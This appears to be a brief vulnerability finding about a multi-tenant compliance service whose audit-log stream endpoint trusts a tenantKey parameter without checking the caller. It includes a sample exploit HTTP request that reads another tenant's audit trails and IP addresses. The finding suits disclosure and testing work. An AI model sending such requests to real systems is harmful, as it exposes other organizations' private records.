diagnosis: The compliance audit query handler routes database calls to an isolated pg-pool based on the tenantKey query parameter without verifying caller credentials against tenantKey. An attacker can stream historical audit trails and actor IP addresses across different tenant organizations.
exploit_request:
GET /api/audit/logs/stream?tenantKey=fintech_corp_01&limit=100 HTTP/1.1
Host: compliance.saas.internal:9106
Authorization: Bearer <unauthorized_tenant_jwt>
Accept: application/json
